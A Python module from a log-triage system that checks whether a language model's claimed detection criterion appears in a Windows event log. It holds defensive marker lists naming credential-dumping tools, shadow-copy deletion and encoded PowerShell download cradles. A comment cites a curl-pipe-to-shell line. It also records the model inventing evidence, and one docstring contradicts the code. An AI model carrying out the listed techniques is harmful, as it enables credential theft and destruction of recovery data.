"""Verify the criterion the model claims to have matched.

The model names a criterion; this decides whether the log actually supports
it. That split matters, because the model does not check - it pattern-completes.

Asked to name which criterion its observation matched, llama3.2:3b answered
"C1 credential access - comsvcs.dll" for an EID 4672 SYSTEM logon whose text
is a list of privilege names. There is no `comsvcs.dll` anywhere in that
event. It had learned the shape of the answer.

Three prompt versions have now oscillated between the two failure modes:

    v2  escalated routine telemetry, copying criterion text into the summary
    v3  described events correctly and never returned CRITICAL at all
    v4  returns CRITICAL, and claims criteria that are not there

Rewording again would move it back. Whether a string is in a log is not a
judgement call and does not belong in the model: the markers below are the
literal evidence each criterion requires, and a claim that survives them is
one the log supports.

This is deliberately narrow. It cannot tell whether a match *means* an
intrusion - `vssadmin delete shadows` is run by backup software too. It only
refuses claims that nothing in the log supports, which is the failure that
kept coming back.
"""

from __future__ import annotations

import base64
import binascii
import functools
import re

# criterion -> (name, [alternatives]); each alternative is a list of substrings
# that must ALL appear. A criterion holds if any alternative holds.
CRITERIA: dict[str, tuple[str, list[list[str]]]] = {
    "C1": ("credential access", [
        ["comsvcs.dll", "minidump"],
        ["procdump", "lsass"],
        ["mimikatz"],
        ["reg", "save", "hklm\\sam"],
        ["reg", "save", "hklm\\system"],
        ["ntds.dit"],
        ["lsass.dmp"],
    ]),
    "C2": ("remote execution", [
        # Administrative shares specifically. The marker here was
        # `imagepath=\\`, which matches any UNC path - so a service installed
        # from the software distribution point, the ordinary way software
        # arrives on a managed estate, was read as lateral movement.
        ["admin$"],
        ["\\c$"],
        ["ipc$"],
        ["wmic", "/node"],
        ["psexec"],
    ]),
    "C3": ("evidence destruction", [
        # Not a bare "1102": that is four digits and appears in process IDs,
        # byte counts and timestamps. The phrase is what identifies the event.
        ["audit log was cleared"],
        ["event log was cleared"],
        ["the system log was cleared"],
        ["add-mppreference", "exclusionpath"],
        ["set-mppreference", "disablerealtimemonitoring"],
    ]),
    "C4": ("persistence to a writable path", [
        # A path is a location, not a mechanism, and this used to match on
        # location alone. `appdata` went first: Slack, Teams and Dropbox all
        # install a Run key there. The rest were the same mistake quieter -
        # Windows Error Reporting writes crash dumps under
        # `C:\ProgramData\Microsoft\Windows\WER\Temp\`, so three of the ten
        # observed events were forced to CRITICAL by a machine reporting that
        # something had crashed.
        #
        # Each alternative now names a mechanism too. Persistence is something
        # that will run again; a file in a writable directory is not.
        ["currentversion\\run", "users\\public"],
        ["currentversion\\run", "\\temp\\"],
        ["currentversion\\run", "\\appdata\\"],
        ["currentversion\\run", "programdata"],
        ["schtasks", "/create", "users\\public"],
        ["schtasks", "/create", "\\temp\\"],
        ["scheduled task was created", "users\\public"],
        ["scheduled task was created", "\\temp\\"],
        ["service was installed", "users\\public"],
        ["service was installed", "\\temp\\"],
    ]),
    "C5": ("obfuscated execution", [
        # `-enc` alone was here and is not an indicator - the corpus makes
        # the point twice, with a developer decoding a config string and this
        # estate's own tooling running an encoded command. What separates them
        # is what the payload does, which `decoded_payload` below can see.
        ["-encodedcommand", "downloadstring"],
        ["-encodedcommand", "net.webclient"],
        ["-enc ", "invoke-expression"],
        ["downloadstring", "http"],
        ["iex(", "new-object"],
        ["iex (", "new-object"],
        ["frombase64string", "invoke-expression"],
    ]),
    "C6": ("destruction of recovery", [
        ["vssadmin", "delete", "shadows"],
        ["wbadmin", "delete"],
        ["bcdedit", "recoveryenabled"],
        [".locked"], [".encrypted"],
    ]),
}

_TAG = re.compile(r"\bC([1-6])\b", re.I)
_BACKSLASHES = re.compile(r"\\+")


def _normalise(text: str) -> str:
    r"""Lower-case, and collapse the ways a Windows path can be spelled.

    The log arrives here JSON-encoded, so `HKLM\SAM` in the event is
    `HKLM\\SAM` in the text being searched, and a marker written the way a
    path is actually written matches nothing. `reg save HKLM\SAM` and
    `C:\Users\Public\svchost.exe` were both missed for exactly that reason:
    the markers were right and the comparison was against a different encoding
    of the same string.

    One pass of un-escaping is not enough. The event's `message` field is
    itself a JSON string holding the enriched event, so serialising the event
    escapes it a second time and `HKLM\SAM` arrives as four backslashes. Any
    run collapses to one instead of guessing how many layers there were - no
    marker here depends on a doubled backslash, and a UNC prefix reduced to
    `\server\admin$` still contains `admin$`.

    Forward slashes fold too - the same path appears both ways depending on
    which producer wrote the event.
    """
    return _BACKSLASHES.sub("\\\\", str(text or "").lower().replace("/", "\\"))


def claimed_criterion(value: str) -> str | None:
    """The criterion tag the model named, or None.

    The field is free text - the model writes "C1 credential access -
    comsvcs.dll" rather than "C1" - so the tag is extracted rather than
    matched exactly.
    """
    if not value:
        return None
    m = _TAG.search(str(value))
    return f"C{m.group(1)}" if m else None


# 24 characters is 18 bytes decoded, which is about the shortest thing worth
# finding - `curl http://x | sh` is 18. A longer minimum missed exactly those,
# and length turned out not to be what keeps noise out anyway: the printable
# check below rejects hex dumps and GUIDs regardless of how long they are.
_B64_RUN = re.compile(r"[A-Za-z0-9+/]{24,}={0,2}")


@functools.lru_cache(maxsize=256)
def decoded_payload(text: str) -> str:
    """Whatever the base64 in this log decodes to, appended to the haystack.

    `-EncodedCommand` is where a payload goes to stop being searchable, and
    matching on the flag alone treats encoding as the indicator - which it is
    not. This estate's own tooling runs encoded commands, and a developer
    decoding a config string looks identical from outside; both were being
    forced to CRITICAL. Decoding moves the question from "was this encoded" to
    "what does it do".

    UTF-16LE and UTF-8 are both tried, since PowerShell uses the first and
    everything else the second. Failures are silent: a run of base64-looking
    characters is usually a GUID or a hash.

    Cached because `resolve()` asks all six criteria about the same log.
    """
    out = []
    for run in _B64_RUN.findall(text or "")[:20]:      # bounded: logs get long
        padded = run + "=" * (-len(run) % 4)
        try:
            blob = base64.b64decode(padded, validate=False)
        except binascii.Error:      # a ValueError subclass; b64decode raises it
            continue
        for codec in ("utf-16-le", "utf-8"):
            try:
                decoded = blob.decode(codec)
            except (UnicodeDecodeError, LookupError):
                continue
            # A wrong guess yields mojibake, not text. Requiring mostly
            # printable ASCII keeps that out of the haystack, where it could
            # otherwise coincide with a marker.
            printable = sum(32 <= ord(c) < 127 for c in decoded)
            if decoded and printable / len(decoded) > 0.9:
                out.append(decoded)
                break
    return " ".join(out)


def supported_by(tag: str, *texts: str) -> bool:
    """Does the log actually contain the evidence this criterion requires?

    `texts` is the log, and deliberately not the model's own `observed`
    field. See resolve() - letting the model's text into the haystack means a
    hallucinated marker validates the claim it was invented for.
    """
    spec = CRITERIA.get((tag or "").upper())
    if not spec:
        return False
    joined = " ".join(t for t in texts if t)
    haystack = _normalise(joined + " " + decoded_payload(joined))
    if not haystack.strip():
        return False
    # Markers go through the same transformation as the text. Folding only one
    # side breaks the comparison in a way that looks like a missing marker:
    # `/` becomes `\`, so the haystack held `wmic \node` while the marker
    # still said `/node` and C2 silently stopped matching wmic entirely.
    return any(all(_normalise(marker) in haystack for marker in alternative)
               for _name, alternatives in [spec] for alternative in alternatives)


def resolve(verdict, log_text: str) -> tuple[str | None, str | None]:
    """Decide which criterion the log actually supports, if any.

    Returns `(tag, note)`. `tag` is the criterion the *log* supports, which is
    not necessarily the one the model named; `note` records a disagreement
    worth keeping in the audit trail.

    The model proposes and the code decides, because the two things being
    asked of it are not equally hard. Pulling the action out of a Windows
    event is language work and it does that well. Deciding whether a string is
    in a list is not language work, and it does that by completing the shape
    of the answer: shown an EID 4672 privilege list it replied "C1 credential
    access - comsvcs.dll", and there is no comsvcs.dll anywhere in that event.

    Checking every criterion rather than only the claimed one matters too. On
    `vssadmin.exe delete shadows /all /quiet` the model claimed C3, evidence
    destruction. The log does not support C3 - but it does support C6, and
    verifying only the claim would have discarded a real detection because the
    model misfiled it.

    What this cannot do is judge whether a supported criterion *means* an
    intrusion; backup software runs `vssadmin delete shadows` too. It settles
    only whether the evidence is present, which is the part that kept
    regressing across three prompt versions.
    """
    # The log only. `observed` was included here at first, on the reasoning
    # that it is a summary and might carry a marker the raw text truncated -
    # which is backwards: `observed` is *derived from* the log, so it can hold
    # nothing the log does not, and including it lets the model manufacture
    # the evidence for its own claim. Writing "comsvcs.dll" into a field and
    # then being asked whether "comsvcs.dll" appears is not a check.
    #
    # This is what let CRITICAL survive on a backup service's network logon.
    supported = [tag for tag in CRITERIA if supported_by(tag, log_text)]
    claimed = claimed_criterion(getattr(verdict, "matched_criterion", "") or "")

    if not supported:
        if claimed:
            return None, (f"model claimed {claimed} ({CRITERIA[claimed][0]}) "
                          f"but the log contains none of its markers")
        return None, None

    # Prefer the model's claim when the log backs it; otherwise take what the
    # log does support, and record the disagreement.
    if claimed in supported:
        return claimed, None
    tag = supported[0]
    if claimed:
        return tag, (f"model claimed {claimed}, log supports {tag} "
                     f"({CRITERIA[tag][0]})")
    return tag, f"log supports {tag} ({CRITERIA[tag][0]}), model claimed none"


def apply(verdict, log_text: str) -> str | None:
    """Bring a verdict into line with what the log supports. Mutates in place.

    Returns a note when the model and the log disagreed, for the audit trail.

    One function, called by the worker that files the row and by the eval that
    scores the model, because those two had already drifted apart once: the
    harness reported 40% escalation recall on runs where production surfaced
    nothing, and nobody could see it because each side had its own idea of
    what counted.

    A supported criterion forces CRITICAL. That is not the code overruling a
    judgement - it is the definition the prompt states, applied where it can
    be applied reliably. An unsupported claim drops to SUSPICIOUS rather than
    to NOT_CRITICAL: the model thought something was worth attention, and only
    its reason for thinking so has been refuted.
    """
    tag, note = resolve(verdict, log_text)

    if tag:
        verdict.matched_criterion = f"{tag} {CRITERIA[tag][0]}"
        verdict.verdict = "CRITICAL"
        if verdict.severity not in ("CRITICAL", "HIGH"):
            verdict.severity = "HIGH"
    elif note:
        # The claim was the stated reason for the verdict - the prompt says
        # "the verdict follows from step 2" - so refuting it removes the
        # basis, not just the label.
        #
        # This was SUSPICIOUS at first, on the reasoning that the model
        # thought *something*. It does not survive contact with the data: v4
        # claims a criterion on almost every event, so downgrading to
        # SUSPICIOUS escalated eight of nine benign cases, including an EID
        # 4672 SYSTEM logon. A reason that is false is not a weaker reason.
        verdict.matched_criterion = "none"
        if verdict.verdict == "CRITICAL":
            verdict.verdict = "NOT_CRITICAL"
            verdict.severity = "INFO"

    elif verdict.verdict == "CRITICAL":
        # CRITICAL while claiming nothing, and nothing in the log to claim.
        # The prompt makes a criterion the requirement for CRITICAL, so this
        # verdict has no stated basis and no findable one.
        #
        # It becomes SUSPICIOUS rather than NOT_CRITICAL, unlike the refuted
        # case above: there the model gave a reason and the reason was false,
        # here it gave none, and "I cannot say why" is weaker evidence than a
        # disproved claim rather than stronger. A network logon by the backup
        # service and a burst of failed logons both landed here.
        verdict.verdict = "SUSPICIOUS"
        if verdict.severity == "CRITICAL":
            verdict.severity = "MEDIUM"
    return note
